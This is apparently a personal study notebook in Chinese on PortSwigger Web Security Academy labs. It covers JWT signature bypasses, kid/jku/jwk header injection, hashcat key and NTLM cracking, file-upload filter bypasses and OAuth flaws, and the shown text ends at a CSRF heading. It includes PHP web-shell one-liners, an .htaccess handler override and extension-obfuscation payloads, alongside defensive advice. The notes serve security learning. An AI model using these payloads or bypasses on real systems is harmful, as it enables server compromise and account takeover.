# Portswigger

##JWT攻击

###组成

JWT:Json web tokens

JWE:Json web  Encryption

JWS:Json web Signature

插件： JWT Editor extension

JWT 由 3 部分组成：标头、有效负载和签名。它们都由一个点分隔，如下例所示：

```
eyJraWQiOiI5MTM2ZGRiMy1jYjBhLTRhMTktYTA3ZS1lYWRmNWE0NGM4YjUiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTY0ODAzNzE2NCwibmFtZSI6IkNhcmxvcyBNb250b3lhIiwic3ViIjoiY2FybG9zIiwicm9sZSI6ImJsb2dfYXV0aG9yIiwiZW1haWwiOiJjYXJsb3NAY2FybG9zLW1vbnRveWEubmV0IiwiaWF0IjoxNTE2MjM5MDIyfQ.SYZBPIBg2CRjXAJ8vCER0LA_ENjII1JakvNQoP-Hw6GG1zfl4JyngsZReIfqRvIAEi5L4HV0q7_9qGhQZvy9ZdxEJbwTxRs_6Lb-fZTDpW6lKYNdMyjw45_alSCZ1fypsMWz_2mTpQzil0lOtps5Ei_z7mM7M8gCwe_AGpI53JxduQOaB5HkT5gVrv9cKu9CsW5MS6ZbqYXpGyOG5ehoxqm8DL5tFYaW3lB50ELxi0KsuTKEbD0t5BCl0aCR2MBJWAbN-xeLwEenaqBiwPVvKixYleeDQiBEIylFdNNIMviKRgXiYuAvMziVPbwSgkZVHeEdF5MQP1Oe2Spac-6IfA
```

Header

```
{"alg":"加密算法","typ":"JWT"}
```

Payload

```
iss: The issuer of the tokensub: The subject of the tokenaud: The audience of the tokenexp: JWT expiration time defined in Unix timenbf: "Not before" time that identifies the time before which the JWT must not be accepted for processingiat: "Issued at" time, in Unix time, at which the token was issuedjti: JWT ID claim provides a unique identifier for the JWT//可以自定义其它字段
```

Signature

```
Signature = HMACSHA256(base64UrlEncode(header) + "." + base64UrlEncode(payload),"secret")
```

secret保存在后端，就是来解析确定验证的key

k：密钥





### 漏洞原理

JWT 漏洞通常是由于应用程序本身存在缺陷的 JWT 处理而出现的。与 JWT 相关的[各种规范](https://portswigger.net/web-security/jwt#jwt-vs-jws-vs-jwe)在设计上相对灵活，允许网站开发人员自行决定许多实现细节。即使在使用久经考验的库时，这也可能导致他们意外引入漏洞。

这些实现缺陷通常意味着没有正确验证 JWT 的签名。这使攻击者能够篡改通过令牌的有效负载传递给应用程序的值。即使签名得到了可靠的验证，它是否可以真正被信任在很大程度上取决于服务器的密钥是否仍然是秘密。如果此密钥以某种方式泄露，或者可以被猜测或暴力破解，则攻击者可以为任意令牌生成有效签名，从而破坏整个机制。



###代码描述

新建一个Molde类，包含你的Token所携带的信息，例如我的：TokenModel

```
using System;namespace JwtCommon{    
/// <summary>Toekn令牌实体包含你所携带的Token信息作为登陆，包含账号，姓名，角色，密码即可</summary> 
	public class TokenModel    {        
		/// <summary>ID</summary>        
		public int Id { get; set; }        
		/// <summary>姓名</summary>        
		public string Name { get; set; }        
		/// <summary>角色</summary>        
		public string Role { get; set; }        
		/// <summary>密码</summary>        
		public string Pass { get; set; }        
		/// <summary>发行人</summary>        
		public string iss { get; set; }        
		/// <summary>订阅人</summary>        
		public string aud { get; set; }        
		/// <summary>密钥</summary>        
		public string key { get; set; }    
	}
}
```

获取Token ：假如我们要回家，要用钥匙打开门才能进去，不然就会拦在门外。与之相对应的，jwt验证。程序要调用某个接口的时候，要有一个"钥匙”即Token令牌
创建一个方法实现创建Token功能
引入Gti包：

1:`**Microsoft.EXtensions.Confoguration** 构造函数读取配置信息`2:`**System.IdentityModel.Tokens.Jwt** 对jwt操作`
有三个参数会在多个地方使用，且应保持一致，因此将其写在配置文件当中 issuer（发行人），audience（订阅人），key（密钥:签署证书）

```
 "JWT": {    
 			"iss": "NetCoreApi",//发行人(此项目)    
 			"aud": "EveryOne",//订阅人(所有人)    
 			"key": "IAmTheMostHandsomeInTheWorld"//秘钥(16位+)  }
```

CreateToken

```
public class JwtHelper    
{       
	public string CreateToken(TokenModel tokenModel)        
	{            
		var claims = new List<Claim>()            
		{                
		new Claim(JwtRegisteredClaimNames.Jti,tokenModel.Id.ToString()),
		//Jti(Jwt Id,唯一标识) 
		new Claim(JwtRegisteredClaimNames.Iss,tokenModel.iss),                
		new Claim(JwtRegisteredClaimNames.Aud,tokenModel.aud),                
		//nbf(not before)可以理解为:Token生效的时间，在你设定的生效时间之前Token是无效的
        new Claim(JwtRegisteredClaimNames.Nbf,$"{new DateTimeOffset(DateTime.Now).ToUnixTimeSeconds()}"),                
        //exp(expiration time)过期时间，当前时间+你设置的过期时间                
        new Claim(JwtRegisteredClaimNames.Exp,$"{new DateTimeOffset(DateTime.Now.AddMinutes(1)).ToUnixTimeSeconds()}"),                
        //jwt发行时间，可以获取jwt年龄(能知道jwt什么吧时候开始工作的)                
        new Claim(JwtRegisteredClaimNames.Iat,$"{new DateTimeOffset(DateTime.Now).ToUnixTimeSeconds()}"),                
        new Claim(ClaimTypes.Name,tokenModel.Name)//姓名            
       };            
       //假设有多个角色，批量添加(将role切割成多个角色，查询出每一个角色添加到claims中去)
       claims.AddRange(tokenModel.Role.Split(',').Select(a => new Claim(ClaimTypes.Role, a)));            
       //设置密钥            
       var key68 = new SymmetricSecurityKey(Encoding.UTF8.GetBytes(tokenModel.key));
       var keycode = new SigningCredentials(key68, SecurityAlgorithms.HmacSha256);
       var jwt = new JwtSecurityToken(issuer: tokenModel.iss, claims: claims, signingCredentials: keycode);            
       var JwtToken = new JwtSecurityTokenHandler().WriteToken(jwt);            
       return JwtToken;        
       }    
}
```

我们去控制器里调用这个方法，来得到Token，我的控制器叫EatDinnerController

CreateToken

```
#region [构造]        ///构造函数是为了得到Appsettinggs.json里的配置信息        
public IConfiguration _configuration { get; }        
public EatDinnerController(IConfiguration configuration)        
{            
	_configuration = configuration;        
}        
#endregion        
#region [全局变量]        
JwtHelper _jwtHelper = new JwtHelper();        
#endregion                
/// <summary>获取Token令牌</summary>        
/// <param name="name">姓名</param>        
/// <param name="pass">密码</param>        
/// <returns>Token令牌</returns>        [HttpGet]        [Route("GetToken")]        
public string GetToken(string name, int pass)        
{            //从配置信息读取ISS,AUD,KEY            
	var iss = _configuration["JWT:iss"];            
	var aud = _configuration["JWT:aud"];            
	var key = _configuration["JWT:key"];            
	return _jwtHelper.CreateToken(new TokenModel            
	{                
		aud = aud,                
		Id = (new Random().Next(10) + 1),//没有连接数据库，Id先随机任意的数字吧
         iss = iss,                
         key = key,                
         Name = name,                
         Pass = pass.ToString(),                
         Role = "Admin,User,Jack"            
     });        
}
```

https://baijiahao.baidu.com/s?id=1731170931931191167&wfr=spider&for=pc

### 方向

#### 利用有缺陷的 JWT 签名验证

#####接受任意签名

JWT 库通常提供一种验证令牌的方法和另一种仅对它们进行解码的方法。例如，Node.js 库`jsonwebtoken`具有`verify()`和`decode()`.

有时，开发人员会混淆这两种方法，只将传入的令牌传递给该`decode()`方法。这实际上意味着应用程序根本不验证签名。

labs:通过未经验证的签名绕过 JWT 身份验证

wp：直接修改目录及jet中的sub

#####接受没有签名的令牌

除其他外，JWT 标头包含一个`alg`参数。这告诉服务器使用哪种算法对令牌进行签名，因此在验证签名时需要使用哪种算法。

```
{
    "alg": "HS256",
    "typ": "JWT"
}
```

这本质上是有缺陷的，因为服务器别无选择，只能隐式地信任来自令牌的用户可控输入，此时根本没有验证。换句话说，攻击者可以直接影响服务器检查令牌是否可信的方式。

JWT 可以使用一系列不同的算法进行签名，但也可以不签名。在这种情况下，`alg`参数设置为`none`，表示所谓的“不安全的 JWT”。由于这种明显的危险，服务器通常会拒绝没有签名的令牌。但是，由于这种过滤依赖于字符串解析，您有时可以使用经典的混淆技术绕过这些过滤器，例如混合大写和意外编码。

labs: 通过有缺陷的签名验证绕过 JWT 身份验证

wp：修改目录及jet中的sub,将alg改为none，去除签字部分，保留签字前面的小数点。

####暴力破解密钥



一些签名算法，例如 HS256 (HMAC + SHA-256)，使用任意的独立字符串作为密钥。就像密码一样，这个秘密不能被攻击者轻易猜出或暴力破解。然后使用密钥以有效签名重新签署令牌。

在实现 JWT 应用程序时，开发人员有时会犯错误，例如忘记更改默认或占位符密码。他们甚至可能复制并粘贴他们在网上找到的代码片段，然后忘记更改作为示例提供的硬编码密码。[在这种情况下，攻击者使用众所周知的秘密词表](https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list)暴力破解服务器的秘密可能是微不足道的。

#####hashcat

	hashcat的扫描模式
	       0 | Straight（字典破解）                      ：基于字典进行破解
		  1 | Combination（组合破解）                   ：基于多个字典进行破解
		  3 | Brute-force（掩码暴力破解）               ：基于掩码设置进行破解
		  6 | Hybrid Wordlist + Mask（字典+掩码破解）
		  7 | Hybrid Mask + Wordlist（掩码+字典破解）
		  
		  ===一般放在-a的参数里
	
	常用参数	
		-a  指定要使用的扫描模式，其值参考后面对参数。“-a 0”字典攻击，“-a 1” 组合攻击；“-a 3”掩码攻击。
		-m  指定要破解的hash类型，如果不指定类型，则默认是MD5
				===类型，一般根据密文来处判断类型
	
		-o  指定破解成功后的hash及所对应的明文密码的存放位置,可以用它把破解成功的hash写到指定的文件中
	
		--force 忽略破解过程中的警告信息,跑单条hash可能需要加上此选项
		--show  显示已经破解的hash及该hash所对应的明文
	
		--increment  启用增量破解模式,你可以利用此模式让hashcat在指定的密码长度范围内执行破解过程
		--increment-min  密码最小长度,后面直接等于一个整数即可,配置increment模式一起使用
		--increment-max  密码最大长度,同上
		--outfile-format 指定破解结果的输出格式id,默认是3
实例破解


	1，掩码破解
			1、数字破解(8位:12345678)
			hashcat64.exe -m 0 -a 3 25d55ad283aa400af464c76d713c07ad ?d?d?d?d?d?d?d?d
					===-a指定模式
					===-m是MD5
					===掩码匹配8位数字
	
			2、小写字母(6位:abcdef)
			hashcat64.exe -m 0 -a 3 e80b5017098950fc58aad83c8c14978e ?l?l?l?l?l?l
			3、字母+数字(8位:1a31fa1c)
			hashcat64.exe -a 3 -m 0 --force b54e53e2f21b7260df895bc885ceaa3e --increment --increment-min 1 --increment-max 8 ?h?h?h?h?h?h?h?h
					===--force 忽略破解过程中的警告信息
	
	2，字典破解
	
			字典破解密码：
			hashcat64.exe -m 0 -a 0 ./dict/hash.txt ./dict/password.txt -o result.txt
	
					===-a 0是指定字典破解模式，
					===-o是输出结果到文件中


	3，破解Windows hash
			场景：拿下一台win系统的服务器，经过提权和mimikatz得到一串hash。现在用hashcat去破解
			
			NT-hash:
				hashcat64.exe -a 3 -m 1000 b4814903533072474831d4791b7d4a9c ?l?l?l?d?d?d?s
					===-a指定模式
					===-m指定类型，注意这次不是md5,是NTLM对应的值		最后的掩码可以用a

labs:通过弱签名密钥绕过 JWT 身份验证

wp:通过hashcat爆破出弱密钥，通过插件创建密钥并修改k值为爆破出的密钥的base64，修改sub值，通过新密钥进行签字。

ps：如果服务器使用非常弱的密钥，甚至可以逐个字符地暴力破解这个字符，而不是使用单词表

#### JWT 标头参数注入

#####通过 jwk 参数注入自签名 JWT

JSON Web 签名 (JWS) 规范描述了一个可选的`jwk`标头参数，服务器可以使用该参数以 JWK 格式将其公钥直接嵌入到令牌本身中。

```
实例
{
   "kid": "ed2Nf8sb-sD6ng0-scs5390g-fFD8sfxG",
    "typ": "JWT",
    "alg": "RS256",
    "jwk": {
        "kty": "RSA",
       "e": "AQAB",
       "kid": "ed2Nf8sb-sD6ng0-scs5390g-fFD8sfxG",
       "n": "yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9m"
  }
}
```

理想情况下，服务器应该只使用有限的公钥白名单来验证 JWT 签名。

但是，配置错误的服务器有时会使用嵌入在`jwk`参数中的任何密钥。

您可以通过使用自己的 RSA 私钥对修改后的 JWT 进行签名来利用此行为，然后将匹配的公钥嵌入`jwk`标头中。

labs：通过 jwk 标头注入绕过 JWT 身份验证

wp：通过创建RSA密钥，**通过attack-embedded嵌套RSA**（`jwk`添加了一个包含您的公钥的参数），修改目录及sub，绕过验证。

##### 通过 jku 参数注入自签名 JWT

`JKU`的全称是"JSON Web Key Set URL"，用于指定一组用于验证令牌的密钥的URL。类似于`kid`，`JKU`也可以由用户指定输入数据，如果没有经过严格过滤，就可以指定一组自定义的密钥文件，并指定web应用使用该组密钥来验证token。

某些服务器不是直接使用 header 参数嵌入公钥，而是`jwk`允许您使用`jku`(JWK Set URL) header 参数来引用包含密钥的 JWK Set。验证签名时，服务器从该 URL 获取相关密钥。

实例

```
{
    "kid": "1a8d17ec-3544-476d-9baa-cddf5ea264c7",
    "alg": "RS256"
    "jku": "https://exploit-0ad100eb03073118c08a272201ba00e3.web-security-academy.net/exploit"
}
```

labs：通过 jku 标头注入绕过 JWT 身份验证

wp：通过漏洞服务器生成url（通过插件生成RSA，copy公钥到漏洞服务器中）

修改sub及目录，heads标头增加jku参数，最后使用私钥签名。

#####通过 Kid 参数注入自签名 JWT

服务器可以使用多个加密密钥来签署不同类型的数据，而不仅仅是 JWT。出于这个原因，JWT 的头部可能包含一个`kid`（Key ID）参数，该参数帮助服务器在验证签名时识别使用哪个密钥。

验证密钥通常存储为 JWK 集。在这种情况下，服务器可以简单地查找与`kid`令牌相同的 JWK。但是，JWS 规范没有为此 ID 定义具体的结构 - 它只是开发人员选择的任意字符串。例如，他们可能使用`kid`参数来指向数据库中的特定条目，甚至是文件的名称。

如果此参数也容易受到[目录遍历](https://portswigger.net/web-security/file-path-traversal)的影响，则攻击者可能会强制服务器使用其文件系统中的任意文件作为验证密钥。

```
{
    "kid": "../../path/to/file",
    "typ": "JWT",
    "alg": "HS256",
    "k": "asGsADas3421-dfh9DGN-AFDFDbasfd8-anfjkvc"
}
```

如果服务器还支持使用[对称算法](https://portswigger.net/web-security/jwt/algorithm-confusion#symmetric-vs-asymmetric-algorithms)签名的 JWT，这尤其危险。在这种情况下，攻击者可能会将`kid`参数指向一个可预测的静态文件，然后使用与该文件内容匹配的密钥对 JWT 进行签名。

从理论上讲，您可以对任何文件执行此操作，但最简单的方法之一是使用`/dev/null`，它存在于大多数 Linux 系统上。由于这是一个空文件，因此获取它会返回 null。因此，使用 Base64 编码的空字节对令牌进行签名将产生有效的签名。

labs:通过kid标头路径遍历绕过 JWT 身份验证

wp:通过插件生成对成密钥，将k替换为 Base64 编码的空字节（AA==），修改目录及sub，将kid参数修改为../../../../dev/null，使用对称密钥签名。

##### 其他参数

以下标头参数也可能对攻击者感兴趣：

- `cty`（内容类型）- 有时用于声明 JWT 有效负载中内容的媒体类型。这通常从标头中省略，但底层解析库无论如何都可能支持它。如果您找到了绕过签名验证的方法，您可以尝试注入`cty`标头以将内容类型更改为`text/xml`or `application/x-java-serialized-object`，这可能会为[XXE](https://portswigger.net/web-security/xxe)和[反序列](https://portswigger.net/web-security/deserialization)化攻击启用新的向量。
- `x5c`（X.509 证书链） - 有时用于传递 X.509 公钥证书或用于对 JWT 进行数字签名的密钥的证书链。此标头参数可用于注入自签名证书，类似于上面讨论的[`jwk`标头注入](https://portswigger.net/web-security/jwt#injecting-self-signed-jwts-via-the-jwk-parameter)攻击。由于 X.509 格式及其扩展的复杂性，解析这些证书也可能引入漏洞。这些攻击的详细信息超出了这些材料的范围，但有关更多详细信息，请查看[CVE-2017-2800](https://talosintelligence.com/vulnerability_reports/TALOS-2017-0293)和[CVE-2018-2633](https://mbechler.github.io/2018/01/20/Java-CVE-2018-2633)。

#### JWT算法混淆(待)

#####原理

当攻击者能够**强制服务器使用与网站开发人员预期不同的算法**来验证 JSON Web 令牌 ( [JWT](https://portswigger.net/web-security/jwt) ) 的签名时，就会发生算法混淆攻击（也称为密钥混淆攻击） 。如果这种情况没有得到正确处理，这可能使攻击者能够**伪造包含任意值的有效 JWT**，而无需知道服务器的秘密签名密钥。



**算法混淆漏洞**通常是由于 JWT 库的错误实现而出现的。尽管实际验证过程因使用的算法而异，**但许多库提供了一种与算法无关的单一方法来验证签名**。这些方法依赖于`alg`令牌标头中的参数来确定它们应该执行的**验证类型**。



#####实例

```
verify()方法的声明（伪代码）
function verify(token, secretOrPublicKey){
    algorithm = token.getAlgHeader();
    if(algorithm == "RS256"){
        // Use the provided key as an RSA public key
    } else if (algorithm == "HS256"){
        // Use the provided key as an HMAC secret key
    }
}
```

当随后使用此方法的网站开发人员假设它将**专门处理使用 RS256 等非对称算法签名的 JWT 时**，就会出现问题。由于这个有缺陷的假设，他们可能**总是将固定的公钥传递给方法**，如下所示：

```
publicKey = <public-key-of-server>;
token = request.getCookie("session");
verify(token, publicKey);
```

在这种情况下，如果服务器接收到使用对称算法（如 HS256）签名的令牌，则库的通用`verify()`方法会将公钥视为 HMAC 机密。这意味着攻击者可以使用 HS256 和公钥对令牌进行签名，服务器将使用相同的公钥来验证签名。

#### 

您用于签署令牌的公钥必须与存储在服务器上的公钥完全相同。这包括使用相同的格式（例如 X.509 PEM）并保留任何非打印字符，例如换行符。在实践中，您可能需要尝试不同的格式才能使这种攻击起作用。





#####算法混淆攻击步骤

######获取服务器的公钥

######将公钥转换为合适的格式

######使用修改后的有效负载和alg标头设置为HS256

######使用 HS256 对令牌进行签名使用公钥作为秘密





####其他方向

```
一些学习资料：（知识补充）
https://xz.aliyun.com/t/6776
附件：JWT实战-越权
```

###如何防止 JWT 攻击

您可以通过采取以下高级措施来保护您自己的网站免受我们所涵盖的许多攻击：

- 使用最新的库来处理 JWT，并确保您的开发人员完全了解它的工作原理以及任何安全隐患。现代库使您更难以无意中不安全地实现它们，但这并不是万无一失的，因为相关规范具有固有的灵活性。
- 确保对收到的任何 JWT 执行稳健的签名验证，并考虑边缘情况，例如使用意外算法签名的 JWT。
- 对标头实施严格的允许主机白名单`jku`。
- 通过header 参数 确保您不会受到[路径遍历](https://portswigger.net/web-security/file-path-traversal)或 SQL 注入的影响。`kid`

### JWT 处理的其他最佳实践

尽管避免引入漏洞并不是绝对必要的，但我们建议在您的应用程序中使用 JWT 时遵循以下最佳实践：

- 始终为您发行的任何令牌设置到期日期。
- 尽可能避免在 URL 参数中发送令牌。
- 包括`aud`（受众）声明（或类似声明）以指定令牌的预期接收者。这可以防止它在不同的网站上使用。
- 使发行服务器能够撤销令牌（例如，在注销时）。



## 文件上传漏洞

###原理及利用

文件上传漏洞是指 **Web 服务器允许用户在没有充分验证文件名称、类型、内容或大小等内容的情况下**将文件上传到其文件系统。

文件上传漏洞的影响一般取决于**两个关键因素**：

- 网站**未能正确验证文件的某个方面**，无论是其大小、类型、内容等。
- 文件成功**上传后会受到哪些限制**。

在最坏的情况下，文件的类型没有得到正确验证，**服务器配置允许某些类型的文件（例如`.php`和`.jsp`）作为代码执行**。在这种情况下，攻击者可能会上传一个充当 Web shell 的服务器端代码文件，从而有效地授予他们对服务器的完全控制权。

如果文件名没有得到正确验证，这可能允许攻击者通过上传同名文件来覆盖关键文件。如果服务器也容易受到[目录遍历](https://portswigger.net/web-security/file-path-traversal)的攻击，这可能意味着攻击者甚至可以将文件上传到意外位置。

未能确保文件大小在预期阈值范围内还可能导致某种形式的拒绝服务 (DoS) 攻击，攻击者借此填满可用的磁盘空间。

###方向

#### 利用不受限制的文件上传来部署 web shell

网站允许您上传服务器端脚本，例如 PHP、Java 或 Python 文件，并且还配置为将它们作为代码执行。

labs:通过 web shell 上传远程代码执行

wp:上传webshell，history查找文件上传路径，读取敏感文件。

```
playload：
<?php echo file_get_contents('/path/to/target/file'); ?>
<?php echo system($_GET['command']); ?>
```

#### 利用有缺陷的文件上传验证

##### 有缺陷的文件类型验证

提交 HTML 表单时，浏览器通常会在**POST请求**中以**content type发送**所提供的数据**application/x-www-form-url-encoded**（参数拼接在url）。这适用于发送您的姓名、地址等简单文本，但不适用于发送大量二进制数据，例如整个**图像文件或 PDF 文档**。在这种情况下，内容类型**multipart/form-data**（指定传输数据为二进制类型，比如图片、mp3、文件）是首选方法。

网站可能尝试验证文件上传的一种方法是检查此特定于输入的**Content-Type**标头是否与**预期的 MIME 类型**匹配。当此标头的值被服务器**隐式信任**时，可能会出现问题。如果**不执行进一步的验证**来检查文件的内容**是否实际匹配**假定的**MIME 类型**，则可以使用工具轻松**绕过这种防御**。

labs：通过 Content-Type 限制绕过 Web shell 上传

wp：修改content type类型，绕过验证



##### 防止在用户可访问的目录中执行文件

Content-Type防止危险文件类型被上传，但**第二道防线**是**阻止服务器执行任何通过网络溜走的脚本**。

作为预防措施，服务器通常**只运行其 MIME 类型已明确配置为执行的脚本**。否则，它们可能只是**返回某种错误消息**，或者在某些情况下，将文件内容作为**纯文本**提供

这种行为本身可能很有趣，因为可能会提供一种泄漏源代码的方法，但它会使任何创建 Web shell 的尝试无效。

这种配置通常在目录之间有所不同。用户提供的文件上传到的目录可能比文件系统上假定最终用户无法访问的其他位置具有更严格的控制。如果能**将脚本上传**到**不应该包含用户提供的文件的不同目录**，那么服务器最终可能会**执行**脚本。

Web 服务器经常使用请求中的**filename**字段**multipart/form-data**来**确定文件应保存的名称和位置**。

labs：通过路径遍历上传 Web shell

wp：..%2f绕过

即使可以将所有请求发送到**同一个域名**，这通常**指向某种反向代理服务器**，例如负载均衡器。您的请求通常由**幕后的其他服务器处理**，这些服务器的**配置**也可能不同。



#####危险文件类型的黑名单不足

防止用户上传恶意脚本的最明显方法之一是将**具有潜在危险的文件扩展名**，很难明确阻止每个可能用于执行代码的文件扩展名。有时可以通过使用**鲜为人知的替代文件扩展名绕过**此类黑名单，这些扩展名可能仍然是可执行的，例如**.php5；.shtml**等

###### 覆盖服务器配置

在 Apache 服务器执行客户端请求的 PHP 文件之前，开发人员可能必须将以下指令添加到他们的**/etc/apache2/apache2.conf**文件中：

```
LoadModule php_module /usr/lib/apache2/modules/libphp.so
AddType application/x-httpd-php .php
```

许多服务器还**允许开发人员在各个目录中创建特殊的配置文件**，以便**覆盖或添加一个或多个全局设置**。例如，Apache 服务器将从一个名为（`.htaccess`如果存在）的文件中加载特定于目录的配置。

**web.config**文件在 IIS 服务器上进行特定于目录的配置。这可能包括如下指令，在这种情况下允许将 JSON 文件提供给用户：

```
<staticContent>
    <mimeMap fileExtension=".json" mimeType="application/json" />
</staticContent>
```

可以欺骗服务器将任意自定义文件扩展名映射到可执行的 MIME 类型。

labs：通过扩展黑名单绕过 Web shell 上传

wp: 上传.htaccess（playload为AddType application/x-httpd-php .l33t），接着上传新增后缀名文件



######混淆文件扩展名

即使是最详尽的黑名单也可能被经典的混淆技术绕过

假设验证**代码区分大小**写并且无法识别它**exploit.pHp**实际上是一个.php文件。如果随后**将文件扩展名映射到 MIME 类型的代码**不区分大小写，最终可能由服务器执行。

提供多个扩展。根据用于**解析文件名的算法**，以下文件可能被解释为 PHP 文件或 JPG 图像：**exploit.php.jpg**

添加尾随字符。一些组件会去除或忽略尾随空格、点等：**exploit.php.**

尝试**对点、正斜杠和反斜杠**使用 URL 编码（或双 URL 编码）。如果在验证文件扩展名时该值没有被解码，但后来在服务器端被解码，这也可以上传否则会被阻止的恶意文件：**exploit%2Ephp**

在**文件扩展名前添加分号或 URL 编码的空字节字符**。如果验证是用 PHP 或 Java 等高级语言编写的，但服务器使用 C/C++ 中的**低级函数处理文件**，例如，这可能会导致文件名结尾出现差异：**exploit.asp;.jpg**或**exploit.asp%00.jpg**

尝试**使用多字节 unicode 字符**，在 unicode 转换或规范化后可能会转换为空字节和点。**xC0 x2E**如果文件名被解析为 UTF-8 字符串，则类似**xC4 xAE**或**xC0 xAE**可能会被转换为**x2E**，但随后会在用于路径之前转换为**ASCII 字符**。

**双写绕过**等

labs：[通过混淆文件扩展名上传 Web shell

wp：%00.jpg



#####有缺陷的文件内容验证

更安全的服务器不会隐式信任**Content-Type**请求中指定的内容，而是尝试验证文件的内容是否与预期内容实际匹配。

某些文件类型可能总是在其页眉或页脚中包含特定的字节序列。这些可以用作指纹或签名来确定内容是否与预期的类型匹配

labs:通过多语言 Web shell 上传远程执行代码

wp:通过copy将jpg和php合成

####利用文件上传竞争条件

####无需远程执行代码即可利用文件上传漏洞

能够上传服务器端脚本以进行远程代码执行。这是不安全的文件上传功能最严重的后果，但这些漏洞仍然可以通过其他方式被利用。

#####上传恶意客户端脚本

尽管**可能无法在服务器上执行脚本**，但您仍然可以上传脚本以进行客户端攻击。例如，如果您可以**上传 HTML 文件或 SVG 图像**，则可以**使用`<script>`标签来创建[存储的 XSS](https://portswigger.net/web-security/cross-site-scripting/stored)有效负载**。

如果**上传的文件随后出现在其他用户访问的页面上**，则**他们的浏览器将在尝试呈现页面时执行脚本**。请注意，由于[同源策略](https://portswigger.net/web-security/cors/same-origin-policy)限制，这些类型的攻击只有在上传的文件是从您上传文件的**同一源提供时才会起作用**。

#####利用上传文件解析中的漏洞

如果上传的文件看起来既安全又安全，最后的手段是尝试利用特定于解析或处理不同文件格式的漏洞。例如，您知道服务器解析基于 XML 的文件，例如 Microsoft Office`.doc`或`.xls`文件，这可能是[XXE 注入](https://portswigger.net/web-security/xxe)攻击的潜在载体。

###如何防止文件上传漏洞

- 根据**允许扩展名的白名单**而**不是禁止扩展名的黑名单**检查文件扩展名。
- 确保文件名不包含任何可能**被解释为目录或遍历序列** ( `../`) 的子字符串。
- **重命名上传的文件**以避免可能导致现有文件被覆盖的冲突。
- 在**完全验证之前不要将文件上传到服务器的永久文件系统**。
- 尽可能**使用已建立的框架来预处理**文件上传，而**不是尝试编写自己的验证机制**。




##OAuth 2.0 身份验证漏洞

###OAuth工作场景

####两种授权类型

**授权码授权**客户端应用程序向OAuth服务请求数据时询问用户是否同意该请求的访问，当用户接受后，客户端会收到OAuth服务发来的授权code；而后客户端应用程序与OAuth服务之间交换此code来接受“访问令牌”，在获取相关用户数据的时候就使用“访问令牌”进行。

**隐式授权**比授权码授权简单，客户端应用程序不需要通过授权code去交换“访问令牌”，是在用户同意后立即接受“访问令牌”，安全性比授权码授权类型差。

OAuth 允许用户**授予访问（另一个应用程序上的用户帐户的有限访问）权限**，而**无需将其登录凭据**暴露给请求的应用程序，基本 OAuth 流程广泛用于**集成**需要从用户帐户访问某些数据的**第三方功能**。

####三个角色及四个阶段

**客户端应用程序**、**资源所有者**和 **OAuth 服务提供者**之间的一系列交互工作。

1. 客户端应用程序请求访问用户数据的子集，**指定使用的授权类型**以及**访问权限**。
2. 系统会提示用户**登录 OAuth 服务**并**明确访问权限**。
3. 客户端应用程序会收到一个**唯一的访问令牌**，使用令牌进行**API 调用**，从资源服务器获取相关数据。



### OAuth 身份验证

OAuth认证一般实现如下：

1. 用户选择使用其**社交媒体帐户登录**的选项。然后，客户端应用程序使用社交媒体站点的 OAuth 服务请求访问一些可用于识别用户的数据。例如，这可能是在他们的帐户中注册的**电子邮件地址**。
2. 收到访问令牌后，客户端应用程序**从资源服务器请求**此数据，**通常是从专用`/userinfo`端点**。
3. 一旦收到数据，客户端应用程序就会**使用它代替用户名来登录用户**。它从授权服务器接收到的访问令牌通常用于代替传统的密码。

labs：通过 OAuth 隐式流绕过身份验证

wp：先登录自己账号，请求三方时修改登陆凭证（如邮箱地址，账号等）



###OAuth身份验证漏洞是如何产生的？

**普遍缺乏内置的安全功能**。安全性几乎**完全依赖**于开发人员**使用正确的配置选项组合**并在顶部实施他们自己的额外安全措施，例如强大的输入验证。

根据授权类型，**高度敏感的数据也会通过浏览器发送**，这为攻击者提供了各种**拦截数据的机会**。

###识别 OAuth 身份验证

识别 OAuth 身份验证的最可靠方法是通过 Burp 代理您的流量，并在您使用此登录选项时检查相应的 HTTP 消息。无论使用哪种 OAuth 授权类型，**流的第一个请求将始终是对`/authorization`端点的请求**，其中**包含**许多专门**用于 OAuth 的查询参数**。特别要注意`client_id`、`redirect_uri`和`response_type`参数。例如，授权请求通常如下所示：

```
GET /authorization?client_id=12345&redirect_uri=https://client-app.com/callback&response_type=token&scope=openid%20profile&state=ae13d489bd00e3c24 HTTP/1.1
Host: oauth-authorization-server.com
```

###侦察

如果使用外部 OAuth 服务，从授权请求发送到的主机名中识别特定的提供者。由于这些服务提供公共 API，因此通常有详细的文档可以告诉您各种有用的信息，例如端点的确切名称以及正在使用的配置选项。

一旦您知道授权服务器的主机名，您应该始终尝试向`GET`以下标准端点发送请求：

- `/.well-known/oauth-authorization-server`
- `/.well-known/openid-configuration`

这些通常会返回一个 JSON 配置文件，其中包含关键信息，例如可能支持的附加功能的详细信息。

###利用 OAuth 身份验证漏洞

漏洞可能出现在客户端应用程序的 OAuth 实现中以及 OAuth 服务本身的配置中.在这两种情况下利用一些最常见的漏洞。

- 客户端应用程序中的漏洞
  - 隐式授权类型LABS[的不正确实现](https://portswigger.net/web-security/oauth#improper-implementation-of-the-implicit-grant-type)
  - [有缺陷的 CSRF 保护](https://portswigger.net/web-security/oauth#flawed-csrf-protection) LABS
- OAuth 服务中的漏洞
  - [泄露授权码和访问令牌](https://portswigger.net/web-security/oauth#leaking-authorization-codes-and-access-tokens) LABS
  - [有缺陷的范围验证](https://portswigger.net/web-security/oauth#flawed-scope-validation)
  - [未经验证的用户注册](https://portswigger.net/web-security/oauth#unverified-user-registration)

### OAuth 客户端应用程序中的漏洞

OAuth 流程中有很多活动部分，每种**授权类型**中都**有许多可选参数和配置设置**，这意味着**错误配置**的范围很大。

#### 隐式授权类型的不正确实现

客户端应用程序通常会在请求中将用户数据提交给服务器，`POST`然后为用户**分配一个会话 cookie**，从而有效地让他们登录。这个请求大致相当于可能作为表单提交请求的一部分发送的表单提交请求。经典的**基于密码的登录**。但是，在这种情况下，**服务器没有任何秘密或密码**可以**与提交的数据进行比较**，这意味着它是**隐式信任**的。

在隐式流程中，此`POST`请求通过他们的浏览器暴露给攻击者。因此，如果**客户端应用程序未正确检查访问令牌是否与请求中的其他数据匹配**，则此行为可能会导致严重漏洞。在这种情况下，攻击者可以简单地更改发送到服务器的参数来**冒充任何用户**。

#### 有缺陷的 CSRF 保护

